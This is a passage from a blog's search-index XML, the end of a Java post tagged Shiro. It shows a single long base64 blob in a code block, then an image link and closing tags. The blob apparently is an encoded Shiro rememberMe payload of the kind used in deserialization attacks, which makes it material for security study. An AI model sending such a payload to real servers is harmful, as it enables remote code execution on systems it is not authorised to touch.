<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HNHE2+QzTA2hE+Z40rjHh2eX6Onde/rnm7DAm42IOYcgZgqqjvZP+ueiCX9mo+r7XJ/GHYK6G2jhTz25+5UGvbaZpGWUaJZGXmr4GcQGh+hQ8YRrQLLuH3ENgH7wHibNVPDI7Y6tGv3dQ1EQjywQtztK605ylB2JHEyy21US6LwU7wAa3sREcwWsNQclvNa44kRjkqi1TzQwou+OU95pQP06h<span class="comment">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</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735123471446-c9e713c1-9e66-431d-92e5-1d213035f74f.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
</search>
